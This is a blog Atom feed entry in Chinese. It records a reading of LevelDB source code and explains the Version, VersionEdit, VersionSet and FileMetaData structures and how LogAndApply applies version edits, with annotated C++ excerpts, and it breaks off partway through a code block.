<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Raven&#39;s Blog</title>
  
  <subtitle>zhang.xingrui@foxmail.com</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.ravenxrz.ink/"/>
  <updated>2020-10-12T03:20:17.692Z</updated>
  <id>https://www.ravenxrz.ink/</id>
  
  <author>
    <name>Raven</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>leveldb源码阅读记录-Version数据结构及MANIFEST文件</title>
    <link href="https://www.ravenxrz.ink/archives/90a4812e.html"/>
    <id>https://www.ravenxrz.ink/archives/90a4812e.html</id>
    <published>2020-10-12T03:19:43.000Z</published>
    <updated>2020-10-12T03:20:17.692Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h2 id="1-Version-相关的数据结构"><a href="#1-Version-相关的数据结构" class="headerlink" title="1.Version 相关的数据结构"></a>1.Version 相关的数据结构</h2><p>为什么要用version控制？</p><p>对于同一笔记录，如果读和写同一时间发生，reader可能读到不一致的数据或者是修改了一半的数据。对于这种情况，有三种常见的解决方法：</p><ul><li>悲观锁  ，最简单的处理方式，就是加锁保护，写的时候不许读，读的时候不许写。效率低。 </li><li>乐观锁   它假设多用户并发的事物在处理时不会彼此互相影响，各事务能够在不产生锁的的情况下处理各自影响的那部分数据。在提交数据更新之前，每个事务会先检查在该事务读取数据后，有没有其他事务又修改了该数据。 果其他事务有更新的话，正在提交的事务会进行回滚;这样做不会有锁竞争更不会产生死锁， 但如果数据竞争的概率较高，效率也会受影响 。</li><li>MVCC，MVCC是一个数据库常用的概念。Multiversion concurrency control多版本并发控制。每一个执行操作的用户，看到的都是数据库特定时刻的的快照(snapshot), writer的任何未完成的修改都不会被其他的用户所看到;当对数据进行更新的时候并是不直接覆盖，而是先进行标记, 然后在其他地方添加新的数据，从而形成一个新版本, 此时再来读取的reader看到的就是最新的版本了。所以这种处理策略是维护了多个版本的数据的,但只有一个是最新的。</li></ul><p>leveldb中的version就是MVCC思想的体现。</p><h3 id="1-VersionEdit"><a href="#1-VersionEdit" class="headerlink" title="1. VersionEdit"></a>1. VersionEdit</h3><p>VersionEdit是LevelDB两个Version之间的差量，即：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Versoin0 + VersoinEdit &#x3D; Version1</span><br></pre></td></tr></table></figure><p>差量包括本次操作，新增的文件和删除的文件。</p><p>看看VersionEdit的成员：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span>:</span><br><span class="line"> <span class="keyword">friend</span> <span class="class"><span class="keyword">class</span> <span class="title">VersionSet</span>;</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">typedef</span> <span class="built_in">std</span>::<span class="built_in">set</span>&lt;<span class="built_in">std</span>::pair&lt;<span class="keyword">int</span>, <span class="keyword">uint64_t</span>&gt;&gt; DeletedFileSet;</span><br><span class="line"></span><br><span class="line"> <span class="built_in">std</span>::<span class="built_in">string</span> comparator_;</span><br><span class="line"> <span class="keyword">uint64_t</span> log_number_;</span><br><span class="line"> <span class="keyword">uint64_t</span> prev_log_number_;</span><br><span class="line"> <span class="keyword">uint64_t</span> next_file_number_;</span><br><span class="line"> SequenceNumber last_sequence_;</span><br><span class="line"> <span class="keyword">bool</span> has_comparator_;</span><br><span class="line"> <span class="keyword">bool</span> has_log_number_;</span><br><span class="line"> <span class="keyword">bool</span> has_prev_log_number_;</span><br><span class="line"> <span class="keyword">bool</span> has_next_file_number_;</span><br><span class="line"> <span class="keyword">bool</span> has_last_sequence_;</span><br><span class="line"></span><br><span class="line"> <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::pair&lt;<span class="keyword">int</span>, InternalKey&gt;&gt; compact_pointers_;<span class="comment">// 存放这个version的压缩指针，pair.first对应哪一个level， pair.second 对应哪一个key开始compaction</span></span><br><span class="line"> DeletedFileSet deleted_files_;</span><br><span class="line"> <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::pair&lt;<span class="keyword">int</span>, FileMetaData&gt;&gt; new_files_;</span><br></pre></td></tr></table></figure><p>关注最后3个， compacton_pointers暂时不管，<strong>delted_files_, new_files_是这次版本修改的差量。</strong></p><p><strong>关注new_files_中的FileMetaData，因为一次版本修改新增的文件是这个类的集合，</strong></p><h3 id="2-FileMetaData"><a href="#2-FileMetaData" class="headerlink" title="2. FileMetaData"></a>2. FileMetaData</h3><p>FileMetaData是每个Version内部维持的文件，每层中都有多个FileMetaData（个人猜想，这和SST相关，但是不是SST）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">FileMetaData</span> &#123;</span></span><br><span class="line">  FileMetaData() : refs(<span class="number">0</span>), allowed_seeks(<span class="number">1</span> &lt;&lt; <span class="number">30</span>), file_size(<span class="number">0</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> refs;</span><br><span class="line">  <span class="keyword">int</span> allowed_seeks;  <span class="comment">// Seeks allowed until compaction</span></span><br><span class="line">  <span class="keyword">uint64_t</span> number;</span><br><span class="line">  <span class="keyword">uint64_t</span> file_size;    <span class="comment">// File size in bytes</span></span><br><span class="line">  InternalKey smallest;  <span class="comment">// Smallest internal key served by table</span></span><br><span class="line">  InternalKey largest;   <span class="comment">// Largest internal key served by table</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>很容易猜到这个类应该就是用来记录SST的元数据，即Manifest中的数据。</p><h3 id="3-Version"><a href="#3-Version" class="headerlink" title="3. Version"></a>3. Version</h3><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200917191610062.png" alt="image-20200917200526294" style="zoom:50%;" /><p>来看看Version的成员：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span>:</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里看出leveldb在系统中维护的version组成一个链表，且系统中可能存在多个VersionSet。每个Set维护一（多）组Version</span></span><br><span class="line"> VersionSet* vset_;  <span class="comment">// VersionSet to which this Version belongs</span></span><br><span class="line"> Version* next_;     <span class="comment">// Next version in linked list</span></span><br><span class="line"> Version* prev_;     <span class="comment">// Previous version in linked list</span></span><br><span class="line"> <span class="keyword">int</span> refs_;          <span class="comment">// Number of live refs to this version  // 引用计数，估计和回收Version相关</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">// 每层的files, 每个file都是FileMetadata</span></span><br><span class="line"> <span class="comment">// List of files per level</span></span><br><span class="line"> <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;FileMetaData*&gt; files_[<span class="built_in">config</span>::kNumLevels];</span><br><span class="line"></span><br><span class="line"> <span class="comment">// Next file to compact based on seek stats.</span></span><br><span class="line"> FileMetaData* file_to_compact_;</span><br><span class="line"> <span class="keyword">int</span> file_to_compact_level_;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// compaction相关，根据compactoin_score_决定是否需要compaction</span></span><br><span class="line"> <span class="comment">// Level that should be compacted next and its compaction score.</span></span><br><span class="line"> <span class="comment">// Score &lt; 1 means compaction is not strictly needed.  These fields</span></span><br><span class="line"> <span class="comment">// are initialized by Finalize().</span></span><br><span class="line"> <span class="keyword">double</span> compaction_score_;</span><br><span class="line"> <span class="keyword">int</span> compaction_level_;</span><br></pre></td></tr></table></figure><p>next_和prev_指针，表明version之间组成一个双链表。</p><p>files_是这个version的files。</p><p>下面是和compaction相关的结构。</p><h3 id="4-VersionSet"><a href="#4-VersionSet" class="headerlink" title="4. VersionSet"></a>4. VersionSet</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Builder</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">friend</span> <span class="class"><span class="keyword">class</span> <span class="title">Compaction</span>;</span></span><br><span class="line"><span class="keyword">friend</span> <span class="class"><span class="keyword">class</span> <span class="title">Version</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">ReuseManifest</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; dscname, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; dscbase)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Finalize</span><span class="params">(Version* v)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetRange</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;FileMetaData*&gt;&amp; inputs, InternalKey* smallest,</span></span></span><br><span class="line"><span class="function"><span class="params">InternalKey* largest)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetRange2</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;FileMetaData*&gt;&amp; inputs1,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;FileMetaData*&gt;&amp; inputs2,</span></span></span><br><span class="line"><span class="function"><span class="params">InternalKey* smallest, InternalKey* largest)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SetupOtherInputs</span><span class="params">(Compaction* c)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Save current contents to *log</span></span><br><span class="line"><span class="function">Status <span class="title">WriteSnapshot</span><span class="params">(<span class="built_in">log</span>::Writer* <span class="built_in">log</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AppendVersion</span><span class="params">(Version* v)</span></span>;</span><br><span class="line"></span><br><span class="line">Env* <span class="keyword">const</span> env_;</span><br><span class="line"><span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> dbname_;</span><br><span class="line"><span class="keyword">const</span> Options* <span class="keyword">const</span> options_;</span><br><span class="line">TableCache* <span class="keyword">const</span> table_cache_;</span><br><span class="line"><span class="keyword">const</span> InternalKeyComparator icmp_;</span><br><span class="line"><span class="keyword">uint64_t</span> next_file_number_;</span><br><span class="line"><span class="keyword">uint64_t</span> manifest_file_number_;</span><br><span class="line"><span class="keyword">uint64_t</span> last_sequence_;</span><br><span class="line"><span class="keyword">uint64_t</span> log_number_;</span><br><span class="line"><span class="keyword">uint64_t</span> prev_log_number_;  <span class="comment">// 0 or backing store for memtable being compacted</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Opened lazily</span></span><br><span class="line">WritableFile* descriptor_file_;</span><br><span class="line"><span class="built_in">log</span>::Writer* descriptor_log_;</span><br><span class="line">Version dummy_versions_;  <span class="comment">// Head of circular doubly-linked list of versions.链表head</span></span><br><span class="line">Version* current_;        <span class="comment">// == dummy_versions_.prev_ 当前version</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 下一次compaction时，每层compaction的开始key</span></span><br><span class="line"><span class="comment">// Per-level key at which the next compaction at that level should start.</span></span><br><span class="line"><span class="comment">// Either an empty string, or a valid InternalKey.</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> compact_pointer_[<span class="built_in">config</span>::kNumLevels];</span><br></pre></td></tr></table></figure><p><img data-src="https://bean-li.github.io/assets/LevelDB/version_versionset.png" alt="img"></p><p>LevelDB会触发Compaction，会对一些文件进行清理操作，让数据更加有序，清理后的数据放到新的版本里面，而老的数据作为原始的素材，最终是要清理掉的，但是如果有读事务位于旧的文件，那么暂时就不能删除。因此利用引用计数，只要一个Verison还活着，就不允许删除该Verison管理的所有文件。当一个Version生命周期结束，它管理的所有文件的引用计数减1.</p><p>当一个version被销毁时，每个和它想关联的file的引用计数都会-1，当引用计数小于=0时，file被删除：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Version::~Version() &#123;</span><br><span class="line">  assert(refs_ == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Remove from linked list</span></span><br><span class="line">  prev_-&gt;next_ = next_;</span><br><span class="line">  next_-&gt;prev_ = prev_;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Drop references to files</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> level = <span class="number">0</span>; level &lt; <span class="built_in">config</span>::kNumLevels; level++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; files_[level].<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">      FileMetaData* f = files_[level][i];</span><br><span class="line">      assert(f-&gt;refs &gt; <span class="number">0</span>);</span><br><span class="line">      f-&gt;refs--;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;refs &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">delete</span> f;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-VersionEdit-amp-Version"><a href="#5-VersionEdit-amp-Version" class="headerlink" title="5.  VersionEdit &amp; Version"></a>5.  VersionEdit &amp; Version</h3><p>前面说到， Version + VersionEdit = new Version，如何应用这个增量呢？</p><p>具体的操作是在VersionSet中的Builder中的。</p><p>首先可以看到，Builder是在 LogAndApply，Recover中被调用的：</p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200917210900575.png" alt="image-20200917210900575" style="zoom:50%;" /><p>重点看一下LogAndApply</p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200917210931871.png" alt="image-20200917210931871" style="zoom:50%;" /><p>可以看到，一共有4个函数调用了LogAndApply，DB打开时，其余3个都是和Compaction相关。</p><p>说LogAndApply之前，先说一下VersionEdit：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">private</span>:</span><br><span class="line"> <span class="keyword">friend</span> <span class="class"><span class="keyword">class</span> <span class="title">VersionSet</span>;</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">typedef</span> <span class="built_in">std</span>::<span class="built_in">set</span>&lt;<span class="built_in">std</span>::pair&lt;<span class="keyword">int</span>, <span class="keyword">uint64_t</span>&gt;&gt; DeletedFileSet; <span class="comment">// level和filenumber的pair</span></span><br><span class="line">DeletedFileSet deleted_files_;</span><br><span class="line"> <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::pair&lt;<span class="keyword">int</span>, FileMetaData&gt;&gt; new_files_;<span class="comment">// level和filemetadata</span></span><br></pre></td></tr></table></figure><p>先看==<strong>deleted_files_</strong>:==</p><p>只在RemoveFile函数调用中，增加。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Delete the specified "file" from the specified "level".</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RemoveFile</span><span class="params">(<span class="keyword">int</span> level, <span class="keyword">uint64_t</span> file)</span> </span>&#123;</span><br><span class="line">  deleted_files_.insert(<span class="built_in">std</span>::make_pair(level, file));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RemoveFile函数调用，有两个函数caller:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20201006194127291.png" alt="image-20201006194127291"></p><p>AddInputDeletions， 在常规compaction中，加入所有选中了的compaction文件。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Compaction::AddInputDeletions</span><span class="params">(VersionEdit* edit)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> which = <span class="number">0</span>; which &lt; <span class="number">2</span>; which++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; inputs_[which].<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        <span class="comment">// !!!</span></span><br><span class="line">      edit-&gt;RemoveFile(level_ + which, inputs_[which][i]-&gt;number);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BackgroundCompaction，上层与下层不重叠的情况。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Status status;</span><br><span class="line"> <span class="keyword">if</span> (c == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">   <span class="comment">// Nothing to do</span></span><br><span class="line"> &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!is_manual &amp;&amp; c-&gt;IsTrivialMove()) &#123;</span><br><span class="line">   <span class="comment">// Move file to next level</span></span><br><span class="line">   assert(c-&gt;num_input_files(<span class="number">0</span>) == <span class="number">1</span>);</span><br><span class="line">   FileMetaData* f = c-&gt;input(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">     <span class="comment">// !!!!</span></span><br><span class="line">   c-&gt;edit()-&gt;RemoveFile(c-&gt;level(), f-&gt;number);</span><br><span class="line">   c-&gt;edit()-&gt;AddFile(c-&gt;level() + <span class="number">1</span>, f-&gt;number, f-&gt;file_size, f-&gt;smallest,</span><br><span class="line">                      f-&gt;largest);</span><br><span class="line">   status = versions_-&gt;LogAndApply(c-&gt;edit(), &amp;mutex_);</span><br><span class="line">   <span class="keyword">if</span> (!status.ok()) &#123;</span><br><span class="line">     RecordBackgroundError(status);</span><br><span class="line">   &#125;</span><br><span class="line">   VersionSet::LevelSummaryStorage tmp;</span><br><span class="line">   Log(options_.info_log, <span class="string">"Moved #%lld to level-%d %lld bytes %s: %s\n"</span>,</span><br><span class="line">       <span class="keyword">static_cast</span>&lt;<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>&gt;(f-&gt;number), c-&gt;level() + <span class="number">1</span>,</span><br><span class="line">       <span class="keyword">static_cast</span>&lt;<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>&gt;(f-&gt;file_size),</span><br><span class="line">       status.ToString().c_str(), versions_-&gt;LevelSummary(&amp;tmp));</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>再看==<strong>new_files_</strong>==</p><p>new_files_在==<strong>AddFile</strong>==中增加：‘</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Add the specified file at the specified number.</span></span><br><span class="line"><span class="comment">// REQUIRES: This version has not been saved (see VersionSet::SaveTo)</span></span><br><span class="line"><span class="comment">// REQUIRES: "smallest" and "largest" are smallest and largest keys in file</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddFile</span><span class="params">(<span class="keyword">int</span> level, <span class="keyword">uint64_t</span> file, <span class="keyword">uint64_t</span> file_size,</span></span></span><br><span class="line"><span class="function"><span class="params">             <span class="keyword">const</span> InternalKey&amp; smallest, <span class="keyword">const</span> InternalKey&amp; largest)</span> </span>&#123;</span><br><span class="line">  FileMetaData f;</span><br><span class="line">  f.number = file;</span><br><span class="line">  f.file_size = file_size;</span><br><span class="line">  f.smallest = smallest;</span><br><span class="line">  f.largest = largest;</span><br><span class="line">  new_files_.push_back(<span class="built_in">std</span>::make_pair(level, f));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>AddFile被下图中的3各函数call：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20201006194516231.png" alt="image-20201006194516231"></p><p>WriteLevel0Table中是memtable dump 到level0所生成的新文件。</p><p>BackgroundCompaction是上层与下层不重叠的情况。</p><p>说说InstallCompactionResults：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Status <span class="title">DBImpl::InstallCompactionResults</span><span class="params">(CompactionState* compact)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// Add compaction outputs</span></span><br><span class="line">  compact-&gt;compaction-&gt;AddInputDeletions(compact-&gt;compaction-&gt;edit());</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">int</span> level = compact-&gt;compaction-&gt;level();</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; compact-&gt;outputs.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> CompactionState::Output&amp; out = compact-&gt;outputs[i];</span><br><span class="line">     <span class="comment">// 在level+1中生成新文件的结果</span></span><br><span class="line">    compact-&gt;compaction-&gt;edit()-&gt;AddFile(level + <span class="number">1</span>, out.number, out.file_size,</span><br><span class="line">                                         out.smallest, out.largest);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> versions_-&gt;LogAndApply(compact-&gt;compaction-&gt;edit(), &amp;mutex_);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-如何应用VersionEdit-Version-New-Version"><a href="#2-如何应用VersionEdit-Version-New-Version" class="headerlink" title="2. 如何应用VersionEdit+Version = New Version"></a>2. 如何应用VersionEdit+Version = New Version</h2><h3 id="1-LogAndApply"><a href="#1-LogAndApply" class="headerlink" title="1. LogAndApply"></a>1. LogAndApply</h3><p>看一下LogAndApply的工作：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Status <span class="title">VersionSet::LogAndApply</span><span class="params">(VersionEdit* edit, port::Mutex* mu)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 为edit生成log_number</span></span><br><span class="line">  <span class="keyword">if</span> (edit-&gt;has_log_number_) &#123;</span><br><span class="line">    assert(edit-&gt;log_number_ &gt;= log_number_);</span><br><span class="line">    assert(edit-&gt;log_number_ &lt; next_file_number_);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    edit-&gt;SetLogNumber(log_number_);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!edit-&gt;has_prev_log_number_) &#123;</span><br><span class="line">    edit-&gt;SetPrevLogNumber(prev_log_number_);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  edit-&gt;SetNextFile(next_file_number_);</span><br><span class="line">  edit-&gt;SetLastSequence(last_sequence_);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 引用edit到当前版本</span></span><br><span class="line">  Version* v = <span class="keyword">new</span> Version(<span class="keyword">this</span>);</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="function">Builder <span class="title">builder</span><span class="params">(<span class="keyword">this</span>, current_)</span></span>;</span><br><span class="line">    builder.Apply(edit);</span><br><span class="line">    builder.SaveTo(v);</span><br><span class="line">  &#125;</span><br><span class="line">    </span><br><span class="line">   <span class="comment">// 计算v的compaction相关变量，（compaction level和compaction score)</span></span><br><span class="line">  Finalize(v);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Initialize new descriptor log file if necessary by creating</span></span><br><span class="line">  <span class="comment">// a temporary file that contains a snapshot of the current version.</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span> new_manifest_file;</span><br><span class="line">  Status s;</span><br><span class="line">  <span class="keyword">if</span> (descriptor_log_ == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    <span class="comment">// No 